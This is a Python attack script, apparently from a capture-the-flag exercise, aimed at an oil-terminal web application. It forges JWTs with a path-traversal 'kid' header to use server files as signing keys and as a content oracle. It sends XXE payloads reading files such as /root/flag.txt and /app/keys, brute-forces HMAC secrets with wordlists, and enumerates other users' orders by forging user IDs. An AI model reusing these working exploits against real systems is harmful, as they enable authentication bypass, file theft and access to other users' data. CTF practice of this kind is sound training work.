#!/usr/bin/env python3
"""round81 — Kid oracle to extract carrier key content + PROBE_SECRET verification
The oracle is CONFIRMED: kid=filepath, key=file_content → 200 if match.
File content includes trailing newline. Now we use this to:
1. Verify if carrier key = PROBE_SECRET (test HMAC with carrier key candidates)
2. Extract carrier key by testing known patterns
3. Use oracle to binary-search for key length and content
"""
import requests, json, time, hashlib, hmac as hm, base64, string, itertools

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def kid_oracle(filepath, key_bytes, timeout=5):
    """Returns True if key_bytes matches the content of filepath"""
    token = jwt_forged(role="operator", kid=filepath, key=key_bytes)
    try:
        r = requests.get(f"{CASPI}/api/auth/me",
                        headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
        return r.status_code == 200
    except:
        return False

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        if r.status_code == 200:
            data = json.loads(r.text)
            return 200, data.get("summary", data.get("ticket", {})).get(field, "")
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

# ============================================================
print("="*70)
print("PHASE 0: ORACLE SANITY CHECK")
print("="*70)

# Verify oracle still works
assert kid_oracle("/dev/null", b''), "Oracle baseline FAILED!"
assert kid_oracle("/etc/hostname", b'5407f6317f5c\n'), "Oracle hostname FAILED!"
assert not kid_oracle("/etc/hostname", b'wrong'), "Oracle false positive!"
print("  Oracle confirmed working ✓")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 1: DETERMINE CARRIER KEY FORMAT")
print("="*70)
print("  /app/keys/carrier returns 400 via XXE (binary content)")
print("  Let's figure out if it's text or binary, and its length")

# Test if carrier key is empty
if kid_oracle("/app/keys/carrier", b''):
    print("  *** CARRIER KEY IS EMPTY! ***")
elif kid_oracle("/app/keys/carrier", b'\n'):
    print("  *** CARRIER KEY IS JUST A NEWLINE! ***")
else:
    print("  Carrier key is NOT empty")

# Test common key formats — short common secrets first
print("\n  Testing common key values:")
common_keys = [
    # Short common
    b"secret\n", b"secret", b"key\n", b"key",
    b"carrier\n", b"carrier", b"operator\n", b"operator",
    b"admin\n", b"admin", b"password\n", b"password",
    b"changeme\n", b"changeme", b"test\n", b"test",
    # CTF/app themed
    b"caspiterminal\n", b"CaspiTerminal\n",
    b"caspi\n", b"Caspi\n",
    b"terminal\n", b"Terminal\n",
    b"oil-depot\n", b"khs-oil-depot\n",
    b"kazhackstan\n", b"KazHackStan\n",
    b"probe\n", b"PROBE\n",
    b"hmac\n", b"HMAC\n",
    b"flag\n", b"FLAG\n",
    b"shell\n", b"SHELL\n",
    b"llehs\n", b"LLEHS\n",
    # UUID format
    b"00000000-0000-0000-0000-000000000000\n",
    # Hex strings of common lengths
    b"deadbeef\n", b"cafebabe\n",
    # The flag hashes
    b"c8142af02727b3d7d51e4aece866104b\n",
    b"c360e9431fb630289c4e99b0c9c3641e08dd924c24ca5a95\n",
    # Known infrastructure values
    b"terminal_web_pw\n", b"terminal_web\n",
    b"5407f6317f5c\n",  # hostname
    b"gauge-gw.internal\n",
    b"172.18.0.4\n",
    # Simple byte patterns
    bytes([0]), bytes([0, 0]), bytes([0xFF]),
    b"\x00\n", b"\xff\n",
]

found_carrier = None
for key in common_keys:
    if kid_oracle("/app/keys/carrier", key):
        print(f"  *** CARRIER KEY = {key!r} ***")
        found_carrier = key
        break
    time.sleep(0.03)

if not found_carrier:
    print(f"  Tested {len(common_keys)} common keys — no match")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: CARRIER KEY LENGTH DETECTION")
print("="*70)
print("  The key returned 400 via XXE — means it has <, >, &, or null bytes")
print("  Binary keys in CTFs are typically 16, 24, 32, or 64 bytes")
print("  We can't directly determine length, but we can narrow it down")

# If the key file has a trailing newline (like other files), the HMAC key
# includes the newline. But binary keys usually DON'T have trailing newlines.
# The 400 error from XXE means it has bytes that break XML.

# Test: is the carrier key a random binary blob? If so, we can't brute-force it.
# But: the kid oracle reads the ENTIRE file as the HMAC key.
# And: the app.py file uses this key for JWT signing.
# In Flask/Python, the key is read from the file and used as-is.

# Let's try: what if carrier key = one of the probe signatures?
url_lm01 = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
sig_lm01_hex = "5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09"
sig_lm01_bytes = bytes.fromhex(sig_lm01_hex)

sig_tests = [
    (sig_lm01_hex.encode(), "lm01 sig hex string"),
    (sig_lm01_bytes, "lm01 sig raw bytes"),
    (sig_lm01_hex.encode() + b'\n', "lm01 sig hex + newline"),
]

for key, desc in sig_tests:
    if kid_oracle("/app/keys/carrier", key):
        print(f"  *** CARRIER KEY = {desc} ***")
        found_carrier = key
        break
    time.sleep(0.03)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: OPERATOR KEY — SAME TESTS")
print("="*70)

# Test operator key with same common values
for key in [b"secret\n", b"operator\n", b"key\n", b"admin\n", b"password\n",
            b"changeme\n", b"test\n", b"caspiterminal\n", b"CaspiTerminal\n",
            b"terminal_web_pw\n", b"LLEHS\n", b"shell\n"]:
    if kid_oracle("/app/keys/operator", key):
        print(f"  *** OPERATOR KEY = {key!r} ***")
        break
    time.sleep(0.03)
else:
    print(f"  Operator key — no match with common values")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: SEARCH FOR FILES CONTAINING PROBE_SECRET")
print("="*70)
print("  Maybe PROBE_SECRET is stored in a file we can read via XXE")
print("  Search config/env files that might be text-only")

# Files we haven't checked yet
new_paths = [
    # Python site-packages — maybe a custom config
    "/usr/local/lib/python3.11/site-packages/caspiterminal/__init__.py",
    "/usr/local/lib/python3.11/site-packages/terminal/__init__.py",
    "/usr/local/lib/python3.11/site-packages/probe/__init__.py",
    # App alternative configs
    "/app/config.json",
    "/app/config.yaml",
    "/app/config.yml",
    "/app/config.toml",
    "/app/config.ini",
    "/app/config.cfg",
    "/app/settings.json",
    "/app/settings.yaml",
    "/app/settings.py",
    "/app/.config",
    "/app/.secret",
    "/app/.key",
    "/app/.probe",
    "/app/probe.key",
    "/app/probe.txt",
    "/app/probe_secret.txt",
    "/app/PROBE_SECRET",
    "/app/.PROBE_SECRET",
    "/app/hmac.key",
    "/app/hmac_key",
    "/app/hmac_key.txt",
    "/app/signing.key",
    "/app/signing_key",
    "/app/signing_key.txt",
    # Etc configs
    "/etc/default/caspiterminal",
    "/etc/default/terminal",
    "/etc/caspiterminal.conf",
    "/etc/terminal.conf",
    # Run configs
    "/run/probe_secret",
    "/run/hmac_key",
    # Var configs
    "/var/lib/caspiterminal/config",
    "/var/lib/terminal/config",
    "/var/local/config",
    "/var/local/secret",
    "/var/local/key",
    # Root
    "/root/.env",
    "/root/.secret",
    "/root/probe_secret",
    "/root/flag.txt",
    "/root/flag",
    # Home
    "/home/app/probe_secret",
    "/home/terminal/probe_secret",
]

found_files = []
for path in new_paths:
    code, val = xxe_read(path, timeout=3)
    if code == 200 and val:
        found_files.append((path, val))
        print(f"  *** FOUND: {path} ({len(val)} bytes): {val[:300]} ***")
    elif code == 400:
        print(f"  EXISTS(400): {path}")
    time.sleep(0.04)

if not found_files:
    print(f"  Checked {len(new_paths)} paths — nothing new")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: USE KID ORACLE TO READ /app/keys/carrier BYTE BY BYTE")
print("="*70)
print("  Strategy: use oracle to determine if carrier key starts with")
print("  specific prefixes. This is a binary search approach.")
print("  First: determine if key is ASCII printable or binary")

# Test if key starts with common ASCII chars
print("\n  Testing first byte of carrier key:")
first_byte_found = None
# Test printable ASCII first (most likely for a text key)
for b in range(0, 256):
    # For binary keys, the file content IS the raw bytes
    # For text keys, it's the text + maybe newline
    # Since XXE returns 400, the key contains < or > or & or null
    # That means at least one byte is 0x00, 0x26(&), 0x3C(<), or 0x3E(>)
    pass

# Actually, a smarter approach:
# The XXE returns 400 for /app/keys/carrier. This means the file content,
# when substituted into XML, causes a parse error.
# Characters that break XML: < (0x3C), > (0x3E), & (0x26), null (0x00)
# Also: invalid UTF-8 sequences

# If the key is random binary, it almost certainly has null bytes or
# non-UTF-8 sequences. In that case, byte-by-byte extraction via oracle
# would require 256 * key_length attempts.

# For a 32-byte key: 256 * 32 = 8192 requests. That's ~40 minutes at 0.3s each.
# For a 16-byte key: 256 * 16 = 4096 requests. That's ~20 minutes.

# But we can be smarter: first find the key LENGTH, then extract.

# Key length detection: try keys of increasing length, all zeros
print("\n  Detecting carrier key length:")
print("  (Testing if key is exactly N bytes of specific patterns)")

# Actually, we can't detect length this way because we'd need to know
# ALL bytes, not just the length.

# Better approach: use the HMAC oracle more cleverly.
# We KNOW the JWT signed by the server with kid="carrier".
# The server reads /app/keys/carrier and uses it as HMAC key.
# Our registered user's JWT signature tells us:
# HMAC-SHA256(carrier_key, jwt_header.jwt_payload) = jwt_signature

# We have this JWT from round80:
# header.payload = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImNhcnJpZXIifQ.eyJzdWIiOjYwNzcsImNvbXBhbnkiOiJDVEZfVGVhbV9mdWJ6bnoiLCJyb2xlIjoiY2FycmllciIsImlhdCI6MTc5MDc2MDAxMywiZXhwIjoxNzkwODQ2NDEzfQ
# signature = 8nBoF23TaW2jXaeo22fJ6ODwO3yXSSUE7LFbzdHEHJk

# This is a KNOWN plaintext-ciphertext pair!
# If we can crack this HMAC, we get the carrier key.

# Let's use hashcat format for JWT cracking
jwt_full = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImNhcnJpZXIifQ.eyJzdWIiOjYwNzcsImNvbXBhbnkiOiJDVEZfVGVhbV9mdWJ6bnoiLCJyb2xlIjoiY2FycmllciIsImlhdCI6MTc5MDc2MDAxMywiZXhwIjoxNzkwODQ2NDEzfQ.8nBoF23TaW2jXaeo22fJ6ODwO3yXSSUE7LFbzdHEHJk"
print(f"\n  JWT for hashcat cracking (mode 16500):")
print(f"  {jwt_full}")

# Instead of brute-force, let's try a FOCUSED approach:
# Test if carrier key matches any READABLE file's content
print("\n  Testing if carrier key = content of known files:")

# Read files we know and test their content (with \n) as carrier key
for path in ["/app/gunicorn.conf.py", "/app/requirements.txt",
             "/app/static/css/app.css", "/etc/hostname"]:
    code, val = xxe_read(path, timeout=5)
    if code == 200 and val:
        test_key = val.encode() if isinstance(val, str) else val
        # With newline (files end with newline in the oracle)
        if kid_oracle("/app/keys/carrier", test_key + b'\n'):
            print(f"  *** CARRIER KEY = content of {path} + \\n ***")
            found_carrier = test_key + b'\n'
        elif kid_oracle("/app/keys/carrier", test_key):
            print(f"  *** CARRIER KEY = content of {path} (no newline) ***")
            found_carrier = test_key
    time.sleep(0.1)

print(f"  No file content match")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: TEST PROBE_SECRET = CARRIER KEY HYPOTHESIS")
print("="*70)
print("  Even without knowing carrier key, we can test the HYPOTHESIS")
print("  that carrier key = PROBE_SECRET")
print("  If true: signing a JWT with kid='/app/keys/carrier' would use")
print("  the same key as probe HMAC. So we can verify by checking")
print("  HMAC(carrier_key, probe_url) against known probe signatures.")

# We can't directly compute HMAC(carrier_key, url) because we don't
# know carrier_key. But we CAN verify indirectly!

# Approach: if carrier_key = PROBE_SECRET, then we can sign arbitrary
# probe URLs. Let's test: sign a NEW URL with carrier key (via kid oracle),
# and see if the probe endpoint accepts it.

# Problem: we can't make the server compute HMAC(carrier_key, url) for us.
# The kid oracle only verifies if our HMAC matches the file content.
# The probe endpoint requires us to PROVIDE the correct signature.

# Alternative: use the KNOWN probe signature to verify.
# sig_lm01 = HMAC-SHA256(PROBE_SECRET, url_lm01)
# If PROBE_SECRET = carrier_key, then:
# signing a JWT with key=sig_lm01_as_bytes and kid=some_test_file won't help...

# Actually, here's a CLEVER approach:
# We know HMAC(PROBE_SECRET, url_lm01) = sig_lm01
# If we write sig_lm01 into a "virtual file" (we can't write files),
# BUT we can use the kid oracle to test if a FILE CONTAINS sig_lm01.

# What if PROBE_SECRET is stored in a file? And that file is one we
# can reference through kid?

# Test: kid = various probe-related paths
probe_key_paths = [
    "/app/keys/probe_secret",
    "/app/keys/probe",
    "/app/keys/hmac",
    "/app/keys/signing",
    "/app/probe.key",
    "/app/probe_secret",
    "/app/.probe_secret",
    "/app/secret",
    "/app/.secret",
    "/var/local/probe/key",
    "/var/local/secret",
    "/run/secrets/probe_secret",
    "/etc/probe_secret",
    "/root/probe_secret",
    "/tmp/probe_secret",
]

# For each path, test if it exists via kid oracle (try empty key and common keys)
print("\n  Scanning for probe secret files via kid oracle:")
for path in probe_key_paths:
    # If the file doesn't exist, kid oracle returns 403 regardless of key
    # If the file exists with known content, we'd need to guess the content
    # But we can check: does the file exist by testing with WRONG content?
    # If file doesn't exist → always 403
    # If file exists → 403 only with wrong key, 200 with right key

    # Actually, we can't distinguish "file doesn't exist" from "wrong key"
    # Both return 403!

    # But we CAN check if the file exists via XXE:
    code, val = xxe_read(path, timeout=3)
    if code == 200 and val:
        print(f"  *** FOUND via XXE: {path} = {val[:200]} ***")
        # Test if this IS the probe secret
        h = hm.new(val.encode(), b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
                   hashlib.sha256).hexdigest()
        if h == sig_lm01_hex:
            print(f"  *** THIS IS THE PROBE_SECRET!!! ***")
        # Also test with newline
        h = hm.new((val + '\n').encode(), b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow",
                   hashlib.sha256).hexdigest()
        if h == sig_lm01_hex:
            print(f"  *** THIS IS THE PROBE_SECRET (with newline)!!! ***")
    elif code == 400:
        print(f"  EXISTS(400): {path} — has special chars")
    time.sleep(0.03)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: FOCUSED WORDLIST — CTF PATTERNS")
print("="*70)
print("  Test specific patterns that CTF challenges commonly use")

url_test = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
sig_test = bytes.fromhex(sig_lm01_hex)

# Generate candidates based on CTF patterns
candidates = []

# Pattern: hex strings of common lengths (16, 32, 64 chars)
# These would be typical CTF secrets
# Test some memorable hex values
hex_candidates = [
    "0123456789abcdef",
    "abcdef0123456789",
    "deadbeefcafebabe",
    "0000000000000000",
    "ffffffffffffffff",
    "1234567890abcdef1234567890abcdef",
    "abcdefabcdefabcdefabcdefabcdefab",
    "00000000000000000000000000000000",
    "ffffffffffffffffffffffffffffffff",
]

for h in hex_candidates:
    candidates.append(h.encode())
    candidates.append(h.encode() + b'\n')

# Pattern: common CTF flag-style secrets
ctf_secrets = [
    "s3cr3t_k3y", "sup3r_s3cr3t", "my_secret_key", "flask_secret",
    "jwt_secret", "hmac_secret", "probe_key", "probe_secret",
    "P@ssw0rd!", "str0ng_k3y", "CTF_SECRET", "ctf_secret",
    "KHS_SECRET", "khs_secret", "CASPI_SECRET", "caspi_secret",
    "OIL_DEPOT_KEY", "oil_depot_key", "terminal_key", "TERMINAL_KEY",
    "gauge_gw_key", "GAUGE_GW_KEY",
    "aktau", "Aktau", "AKTAU", "mangystau", "Mangystau", "MANGYSTAU",
    "caspian", "Caspian", "CASPIAN",
    "APT-AKTAU-01", "apt-aktau-01",
    "BIN041240001357", "041240001357",
    # Leetspeak
    "pr0b3_s3cr3t", "pr0b3_k3y", "g4ug3_gw",
    # Combined patterns
    "caspi-oil-probe", "khs-probe-key", "oil-depot-probe",
    # Long common secrets
    "AllYourBaseAreBelongToUs",
    "TheQuickBrownFoxJumpsOverTheLazyDog",
    "CorrectHorseBatteryStaple",
]

for s in ctf_secrets:
    candidates.append(s.encode())
    candidates.append(s.encode() + b'\n')

# Also test as PROBE_SECRET via kid oracle on carrier key
print(f"\n  Testing {len(candidates)} candidates as PROBE_SECRET...")
found_probe = False
for candidate in candidates:
    h = hm.new(candidate, url_test, hashlib.sha256).digest()
    if h == sig_test:
        print(f"  *** PROBE_SECRET = {candidate!r} ***")
        found_probe = True
        break

if not found_probe:
    print(f"  No HMAC match among {len(candidates)} candidates")

# Also test same candidates as carrier key
print(f"\n  Testing same candidates as carrier key...")
for candidate in candidates:
    if kid_oracle("/app/keys/carrier", candidate):
        print(f"  *** CARRIER KEY = {candidate!r} ***")
        # Test if it's also PROBE_SECRET
        h = hm.new(candidate, url_test, hashlib.sha256).digest()
        if h == sig_test:
            print(f"  *** AND IT'S THE PROBE_SECRET! ***")
        found_carrier = candidate
        break
    time.sleep(0.02)

if not found_carrier:
    print(f"  No carrier key match")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: DATABASE EXPLORATION via PORTAL")
print("="*70)
print("  Users 1-3 have loading orders — the DB has real data!")
print("  Let's check what other data might be in the DB")
print("  The portal shows company-specific data based on sub")

# What company do users 1-3 belong to? The portal always shows OUR
# company name (from JWT). We need to find THEIR company name.
# Try with THEIR sub but WITHOUT a company claim:
# Actually, the JWT always has a company field. Let's try with company=""

for sub_id in [1, 2, 3]:
    # The portal shows "Welcome, <company>" where company is from JWT
    # But the LOADING ORDERS are from the DB, based on... what?
    # If based on company from JWT → all subs with same company see same orders
    # If based on sub → each sub sees different orders ← THIS IS WHAT WE SEE

    # sub=1 with company CTF_Team_fubznz → shows LO-0412, LO-0413
    # sub=2 with company CTF_Team_fubznz → shows LO-0418, LO-0425
    # These are DIFFERENT orders! So orders are based on SUB, not company.

    # Try with sub=1 but different companies to confirm
    if sub_id == 1:
        for company in ["X", "TestCompany", "CaspiOil"]:
            token = jwt_forged(role="carrier", sub=sub_id, company=company)
            try:
                r = requests.get(f"{CASPI}/portal",
                                headers={"Cookie": f"session={token}"}, timeout=8)
                has_orders = "LO-2026" in r.text
                has_no_windows = "No loading windows" in r.text
                if has_orders:
                    print(f"  sub={sub_id}, company='{company}': HAS orders (company doesn't matter!)")
                elif has_no_windows:
                    print(f"  sub={sub_id}, company='{company}': empty portal")
                elif r.status_code == 500:
                    print(f"  sub={sub_id}, company='{company}': [500]")
                else:
                    print(f"  sub={sub_id}, company='{company}': [{r.status_code}] unknown")
            except Exception as e:
                print(f"  sub={sub_id}, company='{company}': {e}")
            time.sleep(0.2)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: SQLi IN PORTAL LOADING ORDERS (sub-based)")
print("="*70)
print("  Loading orders are fetched by sub from JWT")
print("  If query is: SELECT * FROM orders WHERE user_id = <sub>")
print("  And sub is cast to int first, SQLi fails (all 500 in round79)")
print("  But what if sub is used as string?")
print("  Wait — sub=99999 returned 200 with 'No loading windows'")
print("  And sub='ctf' returned 500. So sub IS converted to int!")
print("  If sub is int, SQLi through integer sub requires no quotes")

# Key insight: the portal DOES convert sub to int
# sub=6077 → works
# sub="ctf" → 500 (can't convert to int)
# sub=99999 → works (no orders, shows empty)
# sub="0 UNION SELECT..." → 500 (can't convert to int)

# BUT: what if we pass sub as a FLOAT or other numeric type?
# JSON allows: 6077.0, 6077e0, etc.
# psycopg2 might handle these differently

# Or: what if we craft a JWT where sub is a negative number?
for sub_val in [-1, 0, -6077, 2147483647, -2147483648,
                6077.5, 1e10, "6077.0"]:
    token = jwt_forged(role="carrier", sub=sub_val, company="CTF_Team_fubznz")
    try:
        r = requests.get(f"{CASPI}/portal",
                        headers={"Cookie": f"session={token}"}, timeout=5)
        has_orders = "LO-2026" in r.text
        if r.status_code == 200 and has_orders:
            print(f"  *** sub={sub_val}: HAS ORDERS! ***")
        elif r.status_code == 200:
            pass  # empty portal, expected
        elif r.status_code == 500:
            print(f"  sub={sub_val}: [500]")
    except:
        pass
    time.sleep(0.1)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 10: EXPLORE ALL LOADING ORDERS IN DB")
print("="*70)
print("  Enumerate more user IDs to find ALL loading orders")

all_orders = {}
for sub_id in list(range(1, 51)) + list(range(100, 110)) + list(range(1000, 1010)):
    token = jwt_forged(role="carrier", sub=sub_id, company="CTF_Team_fubznz")
    try:
        r = requests.get(f"{CASPI}/portal",
                        headers={"Cookie": f"session={token}"}, timeout=5)
        if r.status_code == 200 and "LO-2026" in r.text:
            # Extract order references
            import re
            orders = re.findall(r'LO-\d{4}-\d{4}', r.text)
            tanks = re.findall(r'T-\d{2}', r.text)
            products = re.findall(r'<td>([^<]+)</td>\s*<td>[\d.]+ m', r.text)
            if orders:
                all_orders[sub_id] = {
                    "refs": orders,
                    "tanks": tanks,
                    "products": products,
                }
                print(f"  sub={sub_id}: {orders} tanks={tanks} products={products}")
    except:
        pass
    time.sleep(0.05)

print(f"\n  Total users with orders: {len(all_orders)}")
if all_orders:
    all_tanks = set()
    for data in all_orders.values():
        all_tanks.update(data["tanks"])
    print(f"  All tanks referenced: {sorted(all_tanks)}")

print("\n"+"="*70)
print("DONE — round81")
print("="*70)
